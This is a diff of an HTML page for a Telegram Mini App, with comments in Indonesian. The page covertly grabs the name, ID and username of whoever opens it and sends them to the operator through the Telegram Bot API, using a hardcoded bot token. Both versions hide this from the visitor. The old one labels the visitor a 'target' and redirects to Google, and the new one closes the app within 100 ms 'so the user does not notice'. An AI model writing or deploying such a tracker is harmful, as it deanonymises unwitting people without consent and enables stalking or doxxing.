@@ -1,46 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Memuat...</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: transparent; overflow: hidden; }
+    </style>
 </head>
-<body style="background: white; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <div style="font-family: sans-serif; color: #888;">Memuat konten...</div>
-
+<body>
     <script>
         const tg = window.Telegram.WebApp;
-        tg.ready();
+        tg.expand(); // Buka layar penuh
 
-        // Ambil data pengklik
+        // Ambil data user
         const user = tg.initDataUnsafe.user;
-        // Ambil ID kamu dari link (?id=xxx)
-        const params = new URLSearchParams(window.location.search);
-        const myId = params.get('id'); 
-        
-        const botToken = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
 
-        if (user && myId) {
-            // Format mention agar nama target bisa kamu klik untuk liat profilnya
-            const mention = `[${user.first_name}](tg://user?id=${user.id})`;
-            const pesan = `🎯 **Target Terdeteksi!**\n\n👤 Nama: ${mention}\n🆔 ID: \`${user.id}\`\n🔗 User: @${user.username || 'n/a'}`;
-
-            // Kirim notif ke kamu (Admin)
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        if (user) {
+            // KIRIM DATA KE BOT (Admin)
+            // Kita gunakan bot.sendData atau kirim via API Backend
+            fetch(`https://api.telegram.org/bot8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: myId,
-                    text: pesan,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
+                    chat_id: "ID_CHAT_KAMU", // Ganti dengan ID Telegram kamu
+                    text: `🔔 **User Klik!**\nNama: ${user.first_name}\nID: ${user.id}`,
+                    parse_mode: "Markdown"
                 })
-            }).then(() => {
-                // Setelah lapor, alihkan ke Google/situs lain
-                window.location.href = "https://www.google.com";
             });
-        } else {
-            // Jika dibuka di browser biasa luar telegram, langsung lempar ke google
-            window.location.href = "https://www.google.com";
+
+            // Tutup Mini App secara instan agar user tidak sadar
+            setTimeout(() => {
+                tg.close();
+            }, 100);
         }
     </script>
 </body>
